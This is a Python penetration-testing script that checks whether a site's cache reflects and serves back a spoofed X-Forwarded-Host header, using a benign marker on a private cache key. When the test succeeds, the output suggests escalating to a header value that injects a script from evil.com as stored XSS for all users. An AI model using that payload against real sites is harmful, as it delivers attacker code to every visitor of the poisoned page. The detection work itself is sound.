#!/usr/bin/env python3
"""
cache_poison.py — Host-header web-cache-poisoning detector (HOST_HEADER_INJECTION_TESTING_GUIDE.md §12).
Checks whether a spoofed host header is (a) REFLECTED in the response, (b) the response is CACHEABLE, and
(c) the header looks UNKEYED (a benign marker injected on a unique key is then served back without it).

Proves on a NON-SHARED cache key (a unique ?cb= you control) with a BENIGN marker — never poison a
high-traffic shared page for real users.

Usage:
  python3 cache_poison.py -u https://target/ --header X-Forwarded-Host
"""
import argparse, sys, time, uuid
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

def get(url, headers, timeout):
    return requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)

def cache_status(r):
    bits = []
    if r.headers.get("Age"):
        bits.append(f"Age={r.headers['Age']}")
    cc = (r.headers.get("Cache-Control") or "")
    if cc:
        bits.append(f"Cache-Control={cc}")
    xc = r.headers.get("X-Cache") or r.headers.get("CF-Cache-Status") or r.headers.get("X-Cache-Status")
    if xc:
        bits.append(f"X-Cache={xc}")
    return bits

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--header", default="X-Forwarded-Host")
    ap.add_argument("--timeout", type=float, default=12)
    a = ap.parse_args()

    key = uuid.uuid4().hex[:10]
    sep = "&" if "?" in a.url else "?"
    url = f"{a.url}{sep}cb=hhpoc{key}"             # unique, non-shared cache key
    marker = f"hhmark{key}.example"

    print(f"[*] non-shared key: {url}")
    print(f"[*] injecting {a.header}: {marker}\n")

    # 1) injected request
    r1 = get(url, {"User-Agent": "Mozilla/5.0", a.header: marker}, a.timeout)
    reflected = marker in r1.text
    cs1 = cache_status(r1)
    print(f"[1] injected   HTTP {r1.status_code}  reflected={reflected}  cache:[{', '.join(cs1) or 'none'}]")

    # 2) clean follow-up to the SAME key (no injected header) — is the poison served back?
    time.sleep(1)
    r2 = get(url, {"User-Agent": "Mozilla/5.0"}, a.timeout)
    served = marker in r2.text
    cs2 = cache_status(r2)
    print(f"[2] clean GET  HTTP {r2.status_code}  marker-served-back={served}  cache:[{', '.join(cs2) or 'none'}]")

    print()
    if reflected and served:
        print("[POISONED] the marker injected via the header is served on a CLEAN request to the same key →")
        print("           UNKEYED + cacheable → WEB CACHE POISONING. Escalate the marker to a real payload:")
        print('           e.g.  X-Forwarded-Host: a."><script src=//evil.com/x.js></script>   → stored XSS for all (§12).')
        print("           (Prove on this benign key; DESCRIBE shared-cache impact. Don’t poison real pages.)")
    elif reflected and (cs1 or cs2):
        print("[MAYBE] reflected + cache headers present but poison not yet served back. Confirm the header is unkeyed")
        print("        with Burp Param Miner, vary the key, and retry. (§12)")
    elif reflected:
        print("[INFO] reflected but no caching observed → reflected-host XSS angle (§10), not cache poisoning.")
    else:
        print("[*] header not reflected on this endpoint. Try another page, another header, or the reset/routing sinks.")

if __name__ == "__main__":
    main()
